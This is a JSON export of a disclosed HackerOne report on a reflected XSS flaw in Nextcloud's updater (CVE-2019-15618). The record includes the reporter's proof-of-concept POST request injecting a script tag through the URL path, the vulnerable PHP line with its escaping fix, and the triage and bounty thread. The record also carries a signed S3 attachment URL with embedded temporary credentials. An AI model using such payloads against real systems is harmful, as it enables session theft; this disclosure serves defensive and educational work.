{"id":515484,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTU0ODQ=","url":"https://hackerone.com/reports/515484","title":"[Reflected XSS] In Request URL","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2019-03-26T10:13:25.245Z","submitted_at":"2019-03-26T10:13:25.245Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nstikhomirov","url":"/nstikhomirov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/727/4fcfb59c741d3146c30cd190cec346062c2b7bad_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-15618"],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-01T13:18:48.738Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-01-31T13:18:46.758Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In [index.php file](https://github.com/nextcloud/updater/blob/master/index.php#L1765) on 1765 we can see XSS:\n`\u003ca class=\"button\" href=\"\u003c?php echo str_replace('/index.php', '/../', $updaterUrl); ?\u003e\"\u003e`\nBecause NextCloud allow links like: '/index.php/{ANY_CONTENT}'\nIf we will do request like: \n```\nPOST /updater/index.php/h\"\u003e\u003cscript\u003ealert(1);\u003c/script\u003e HTTP/1.1\nHost: vulns.local\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nupdater-secret-input={OUR_SECRET}\n```\nWe will see Reflected XSS: F452129\nTo fix this vulnerability need to patch `\u003ca class=\"button\" href=\"\u003c?php echo str_replace('/index.php', '/../', $updaterUrl); ?\u003e\"\u003e` to `\u003ca class=\"button\" href=\"\u003c?php echo htmlspecialchars(str_replace('/index.php', '/../', $updaterUrl), ENT_QUOTES); ?\u003e\"\u003e`\n\n## Impact\n\nIf the attacker knows the secret phrase, then they can implode illegitimate html code in page","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":452129,"file_name":"Screenshot_2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/452/129/07051b6382b62a5f778213bf538776bc4c3cde23/Screenshot_2.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150843Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e79513d8538e2e9ba3e159a29b017e0e4a863114ae8977faa9d8424e7f47e158","file_size":23784,"type":"image/png"}],"allow_singular_disclosure_at":"2020-03-01T13:18:46.847Z","allow_singular_disclosure_after":-50896196.23581513,"singular_disclosure_allowed":true,"vote_count":37,"voters":["a_d_a_m","sameerphad72","ali","realtess","azraelsec","nstikhomirov","jaisharma","dracula1983","cryptographer","hamzaazam","and 27 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":76,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/updater","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4392554,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","automated_response":true,"created_at":"2019-03-26T10:13:25.777Z","updated_at":"2019-03-26T10:13:25.777Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4393167,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report, the maintainer of the updater has been notified","automated_response":false,"created_at":"2019-03-26T12:56:20.696Z","updated_at":"2019-03-26T12:56:20.696Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4393744,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Nikita,\n\nthanks for this report. We fixed this and the updated version of the updater will be shipped with Nextcloud 14.0.9, 15.0.6 and 16.0.0 Beta 2.","automated_response":false,"created_at":"2019-03-26T14:53:21.319Z","updated_at":"2019-03-26T14:53:21.319Z","actor":{"username":"bc4b4b814949a20af53fc55","cleared":false,"url":"/bc4b4b814949a20af53fc55","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4393748,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","automated_response":false,"created_at":"2019-03-26T14:53:41.065Z","updated_at":"2019-03-26T14:53:41.065Z","actor":{"username":"bc4b4b814949a20af53fc55","cleared":false,"url":"/bc4b4b814949a20af53fc55","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"nstikhomirov","url":"/nstikhomirov"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4393762,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi Nikita, we would award you with $50, because the impact of this one is quite low due to the need of knowledge for the secret.","automated_response":false,"created_at":"2019-03-26T14:56:57.448Z","updated_at":"2019-03-26T14:56:57.448Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"nstikhomirov","url":"/nstikhomirov"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4393804,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for bounty.\nInformation about me:\n* Nikita Tikhomirov\n* nstikhomirov@gmail.com\n* https://nstikhomirov.me/\n* Pentest Generation","automated_response":false,"created_at":"2019-03-26T15:05:14.533Z","updated_at":"2019-03-26T15:05:14.533Z","actor":{"username":"nstikhomirov","cleared":false,"url":"/nstikhomirov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/727/4fcfb59c741d3146c30cd190cec346062c2b7bad_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6096993,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Excuse me, can you request CVE ID for this vulnerability?","automated_response":false,"created_at":"2019-10-21T15:09:43.859Z","updated_at":"2019-10-21T15:09:43.859Z","actor":{"username":"nstikhomirov","cleared":false,"url":"/nstikhomirov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/727/4fcfb59c741d3146c30cd190cec346062c2b7bad_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6932222,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry we forgot to request this. It is requested now and our advisory will be published at https://nextcloud.com/security/advisory/?id=NC-SA-2020-007 soon","automated_response":false,"created_at":"2020-01-31T12:45:26.953Z","updated_at":"2020-01-31T12:45:26.953Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6932431,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-01-31T13:18:46.777Z","updated_at":"2020-01-31T13:18:46.777Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7188414,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-03-01T13:18:48.754Z","updated_at":"2020-03-01T13:18:48.754Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}